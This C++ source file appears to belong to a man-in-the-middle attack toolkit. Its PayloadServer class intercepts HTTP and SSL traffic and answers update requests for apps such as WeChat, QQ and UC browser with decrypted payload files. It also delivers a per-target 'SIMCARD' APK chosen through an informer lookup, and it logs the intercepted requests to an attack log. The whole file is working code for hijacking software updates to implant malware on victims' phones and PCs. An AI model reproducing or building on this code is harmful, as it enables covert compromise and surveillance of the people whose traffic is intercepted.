#include <windows.h>
#include <winsock2.h>
#include <exception>
#include "sslPublic.h"
#include "PayloadServer.h"
#include <iostream>
#include "WeixinAndroid.h"
#include "WeixinPC.h"
#include "../HttpUtils.h"
#include "Toutiao.h"
#include "QQmtt.h"
#include "../Public.h"
#include "../attacker.h"
#include "../FileOper.h"
#include "InformerInterface.h"
#include "../HttpPartial.h"
#include "qq.h"
#include "SSLAttack.h"
#include "../Utils/Tools.h"

using namespace std;

int PayloadServer::PluginServerProc(LPSSLPROXYPARAM spp ,char * recvbuf, int recvlen) {

	int ret = 0;

	char * httpdata = 0;
	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);
	if (httphdr == "") {
		return 0;
	}

	//string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());

	string urlfn = HttpUtils::getUrl(httphdr.c_str(), httphdr.length());
	string filename = "";
	if (urlfn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + urlfn;
	}
	else {
		filename = Public::getPluginPath() + urlfn;
	}
	ret = FileOper::isFileExist(filename);
	if (ret == 0) {
		log("%s %d file not exist:%s\r\n", __FUNCTION__, __LINE__, urlfn.c_str());
		return 0;
	}

	string strip = HttpUtils::getIPstr(spp->saToClient.sin_addr.S_un.S_addr);

	string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");

	char szout[0x1000] ;
	int outlen = sprintf(szout, "%s url:%s,ip:%s\r\n",__FUNCTION__, urlfn.c_str(), strip.c_str());
	Public::writeLogFile(szout);
	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);

	int begin = 0;
	int end = 0;
	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
	if (ret == 0)
	{
		log("range start:%d,end:%d,http:%s\r\n", begin, end, httphdr.c_str());
		char * contentTypeFormat = getPartialContentType(filename);
		ret = SendPluginFile(filename.c_str(), spp, contentTypeFormat, begin, end);
	}
	else {
		char * contentTypeFormat = getContentType(filename);
		ret = SendPluginFile(filename.c_str(), spp, contentTypeFormat);
	}

	return ret;
}



int PayloadServer::SendPluginFile(string filename, LPSSLPROXYPARAM spp, const char * format, int start, int end) {
	int ret = 0;

	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= 0)
	{
		log( "[%s %d]fileDecryptReader file:%s error\r\n", __FUNCTION__,__LINE__,filename.c_str());
		return FALSE;
	}
	
	if (end == 0 || end == -1)
	{
		end = start + filesize - 1;
	}
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (start >= filesize  || start < 0 || end <= 0 || end >= filesize)	
	{
		delete[] lpdata;
		log( "[%s %d]file:%s Partial start:%u,end:%u error\r\n", __FUNCTION__, __LINE__, filename.c_str(),start,end);
		return FALSE;
	}
	int sendsize = end + 1 - start;

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, format, start, end, filesize, sendsize);

	ret = SSL_write(spp->SSLToClient, szDataRespHdr, iDataRespHdrLen);

	Public::writeFile(ATTACK_LOG_FILENAME,szDataRespHdr,iDataRespHdrLen);

	int modulesize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = sendsize / modulesize;
	int sendmod = sendsize % modulesize;
	int i = 0;
	for (i = 0; i < sendtimes; i++)
	{
		ret = SSL_write(spp->SSLToClient, lpdata + start + i*modulesize, modulesize);
		if (ret <= 0)
		{
			break;
		}
	}

	if (sendmod)
	{
		ret = SSL_write(spp->SSLToClient, lpdata + start + i*modulesize, sendmod);
		if (ret <= 0)
		{
		}
	}

	int sslerror = SSL_get_error(spp->SSLToClient, ret);

	delete[] lpdata;
	if (ret <= 0)
	{
		log( "[%s %d]send file payload:%s error code:%u\r\n", __FUNCTION__, __LINE__, filename.c_str(), sslerror);
		return FALSE;
	}
	else {
		log( "[%s %d]send file payload:%s from:%u to:%u ok\r\n", __FUNCTION__, __LINE__, filename.c_str(),start, sendsize);
		return TRUE;
	}
}



int PayloadServer::SendPluginFile(string filename,LPSSLPROXYPARAM spp,const char * format) {

	int ret = 0;

	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE )
	{
		log("[%s %d]fileDecryptReader file:%s error\r\n", __FUNCTION__, __LINE__, filename.c_str());
		return FALSE;
	}

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, format, filesize);

	ret = SSL_write(spp->SSLToClient, szDataRespHdr, iDataRespHdrLen);

	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	int modulesize = SSL_MAX_BLOCK_SIZE;
	int sendtimes = filesize / modulesize;
	int sendmod = filesize % modulesize;
	int i = 0;
	for ( i = 0; i < sendtimes; i ++)
	{
		ret = SSL_write(spp->SSLToClient, lpdata + i*modulesize, modulesize);
		if (ret <= 0)
		{
			break;
		}
	}

	if (sendmod)
	{
		ret = SSL_write(spp->SSLToClient, lpdata + i*modulesize, sendmod);
		if (ret <= 0)
		{
		}
	}

	delete[] lpdata;

	int sslerror = SSL_get_error(spp->SSLToClient, ret);
	if (ret <= 0)
	{
		log("[%s %d]send file payload:%s error code:%u\r\n", __FUNCTION__, __LINE__, filename.c_str(), sslerror);
		return FALSE;
	}
	else {
		log("[%s %d]send file payload:%s ok\r\n", __FUNCTION__, __LINE__, filename.c_str());
		return TRUE;
	}
}



int PayloadServer::PluginServerProc(LPHTTPPROXYPARAM hpp,char * recvbuf,int recvlen) {

	int ret = 0;

	char * httpdata = 0;
	string httphdr = HttpUtils::getHttpHeader(recvbuf, recvlen,&httpdata);
	if (httphdr == "") {
		return 0;
	}
	//string url = HttpUtils::getLongUrl(httphdr.c_str(), httphdr.length());

	string urlfn = HttpUtils::getUrl(httphdr.c_str(), httphdr.length());
	string filename = "";
	if (urlfn.c_str()[0] == '/')
	{
		filename = Public::getPluginPathWithoutSlash() + urlfn;
	}
	else {
		filename = Public::getPluginPath() + urlfn;
	}
	ret = FileOper::isFileExist(filename);
	if (ret == 0) {
		log("%s %d file not exist:%s\r\n", __FUNCTION__, __LINE__, urlfn.c_str());
		return 0;
	}

	string host = HttpUtils::getValueFromKey(httphdr.c_str(), "Host");

	string strip = HttpUtils::getIPstr(hpp->saToClient.sin_addr.S_un.S_addr);

	char szout[0x1000];
	int outlen = sprintf(szout, "%s url:%s,ip:%s\r\n",__FUNCTION__, urlfn.c_str(), strip.c_str());
	Public::writeLogFile(szout);
	Public::writeFile(ATTACK_LOG_FILENAME, recvbuf, recvlen);
	
	if (strstr(filename.c_str(),WEIXIN_ANDROID_PLUGIN_UPDATE_FILENAME))
	{
		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nAccept-Ranges: none\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(filename.c_str(), hpp, szHttpRespHdrAppFormat);	//must be application/octet-stream
		return 0;
	}
	else if (strstr(filename.c_str(), QQMINIBROWSER_FILE_NAME))
	{
		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(filename.c_str(), hpp, szHttpRespHdrAppFormat);	//must be application/octet-stream
		return 0;
	}else if (strstr(filename.c_str(), SIMCARD_APK_FILENAME))
	{
		string username = InformerInterface::getTarget(hpp->saToClient.sin_addr.S_un.S_addr, host.c_str());

		lstrcpyA(hpp->username, username.c_str());

		string fileurl = string("/") + username + "/" + SIMCARD_APK_FILENAME;

		char * szHttpRespHdrAppFormat = 
	"HTTP/1.1 200 OK\r\nAccept-Ranges: none\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
		ret = SendPluginFile(fileurl.c_str(), hpp, szHttpRespHdrAppFormat);
		return 0;
	}

	int begin = 0;
	int end = 0;
	ret = HttpUtils::getRange(httphdr.c_str(), begin, end);
	if (ret == 0)
	{
		char * contentTypeFormat = getPartialContentType(filename);
		log("range start:%d,end:%d,http header:%s\r\n", begin, end, httphdr.c_str());
		ret = SendPluginFile(filename.c_str(), hpp, contentTypeFormat, begin, end);
	}
	else {
		char * contentTypeFormat = getContentType(filename);
		ret = SendPluginFile(filename.c_str(), hpp, contentTypeFormat);
	}

	return ret;
}


int PayloadServer::SendPluginFile(string filename, LPHTTPPROXYPARAM lpparam, const char * szHttpRespHdrFormat, int start, int end) {
	int ret = 0;
	
	if (strstr(filename.c_str(), UCPPAPPSTORE_UPDATE_FILENAME) || strstr(filename.c_str(), UCGAME_UPDATE_FILENAME) ||
		strstr(filename.c_str(), UCALOPHA_UPDATE_FILENAME) ||strstr(filename.c_str(), UCAMAP_UPDATE_FILENAME) )
	{
		ret = HttpPartial::sendPartFileWithoutHdr(filename, lpparam->sockToClient, start, end);
		return ret;
	}

	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE)
	{
		log("[%s %d]fileDecryptReader file:%s error\r\n", __FUNCTION__, __LINE__, filename.c_str());
		return FALSE;
	}

	if (end == 0 || end == -1)
	{
		end = start + filesize - 1;
	}
	
	if (end >= filesize)
	{
		end = filesize - 1;
	}

	if (start >= filesize || start < 0 || end < 0 || end >= filesize)
	{
		delete[] lpdata;
		log( "file:%s Partial start:%u,end:%u error\r\n", filename.c_str(), start, end);

		return FALSE;
	}
	int sendsize = end + 1 - start;

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, start, end, filesize, sendsize);

	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);

	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	ret = send(lpparam->sockToClient, lpdata + start, sendsize, 0);

	delete[] lpdata;
	if (ret <= 0)
	{
		log( "[%s %d]send payload file:%s error code:%u\r\n", __FUNCTION__, __LINE__, filename.c_str(), WSAGetLastError());
		return FALSE;
	}
	else {
		log( "[%s %d]send payload file:%s from:%u, size:%u ok\r\n", __FUNCTION__, __LINE__, filename.c_str(),start,sendsize);
		return TRUE;
	}
}


int PayloadServer::SendPluginFile(string filename, LPHTTPPROXYPARAM lpparam, char * szHttpRespHdrFormat) {
	
	int ret = 0;
	char * lpdata = 0;
	int filesize = 0;
	ret = FileOper::fileDecryptReader(filename, &lpdata, &filesize);
	if (ret <= FALSE)
	{
		log("[%s %d]fileDecryptReader file:%s error\r\n", __FUNCTION__, __LINE__, filename.c_str());
		return FALSE;
	}

	char szDataRespHdr[MAX_RESPONSE_HEADER_SIZE];
	int iDataRespHdrLen = sprintf_s(szDataRespHdr, MAX_RESPONSE_HEADER_SIZE, szHttpRespHdrFormat, filesize);
	ret = send(lpparam->sockToClient, szDataRespHdr, iDataRespHdrLen, 0);

	Public::writeFile(ATTACK_LOG_FILENAME, szDataRespHdr, iDataRespHdrLen);

	ret = send(lpparam->sockToClient, lpdata, filesize, 0);
	delete[] lpdata;
	if (ret <= 0)
	{
		log( "[%s %d]send file payload:%s error code:%u\r\n", __FUNCTION__, __LINE__, filename.c_str(), WSAGetLastError());
		return FALSE;
	}
	else {
		log( "[%s %d]send file payload:%s ok\r\n", __FUNCTION__, __LINE__, filename.c_str());
		return TRUE;
	}
	return ret;
}



char * PayloadServer::getContentType(string url) {

	char * szHttpRespHdrApkFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/vnd.android.package-archive\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrAppFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/octet-stream\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrZipFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: application/zip\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrJsonFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: text/json\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrAnyFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: */*\r\nContent-Length: %u\r\n\r\n";
	char * szHttpRespHdrXmlFormat = "HTTP/1.1 200 OK\r\nConnection: keep-alive\r\nContent-Type: text/xml\r\nContent-Length: %u\r\n\r\n";

	char *httpTypeFormat = 0;

	if (strstr(url.c_str(), ".apk") || strstr(url.c_str(), ".jar"))
	{
		httpTypeFormat = szHttpRespHdrApkFormat;
	}
	else if (strstr(url.c_str(), ".exe") || strstr(url.c_str(), ".dll") || strstr(url.c_str(), ".lib") || strstr(url.c_str(), ".so"))
	{
		httpTypeFormat = szHttpRespHdrAppFormat;
	}
	else if (strstr(url.c_str(), ".zip"))
	{
		httpTypeFormat = szHttpRespHdrZipFormat;
	}
	else if (strstr(url.c_str(),".json") || strstr(url.c_str(), ".txt"))
	{
		httpTypeFormat = szHttpRespHdrJsonFormat;
	}
	else if (strstr(url.c_str(), ".xml"))
	{
		httpTypeFormat = szHttpRespHdrXmlFormat;
	}
	else {
		httpTypeFormat = szHttpRespHdrZipFormat;

	}

	return httpTypeFormat;
}


char * PayloadServer::getPartialContentType(string url) {
	char * szHttpPartialZipFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/zip\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialApkFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/vnd.android.package-archive\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialAppFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: application/octet-stream\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialJsFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: text/json\r\n"
		"Content-Length: %u\r\n\r\n";

	char * szHttpPartialXmlFormat = "HTTP/1.1 206 Partial Content\r\n"
		"Connection: keep-alive\r\n"
		"Connection: closed\r\n"
		"Content-Range: bytes %u-%u/%u\r\n"
		"Content-Type: text/xml\r\n"
		"Content-Length: %u\r\n\r\n";

	char *httpPartailFormat = 0;

	if (strstr(url.c_str(), ".apk") || strstr(url.c_str(), ".jar"))
	{
		httpPartailFormat = szHttpPartialApkFormat;
	}
	else if (strstr(url.c_str(), ".exe") || strstr(url.c_str(), ".dll") || strstr(url.c_str(), ".so") || strstr(url.c_str(), ".lib"))
	{
		httpPartailFormat = szHttpPartialAppFormat;
	}
	else if (strstr(url.c_str(), ".zip"))
	{
		httpPartailFormat = szHttpPartialZipFormat;
	}
	else if (strstr(url.c_str(),".json")|| strstr(url.c_str(), ".txt"))
	{
		httpPartailFormat = szHttpPartialJsFormat;
	}
	else if (strstr(url.c_str(), ".xml"))
	{
		httpPartailFormat = szHttpPartialXmlFormat;
	}
	else
	{
		httpPartailFormat = szHttpPartialZipFormat;
	}

	return httpPartailFormat;
}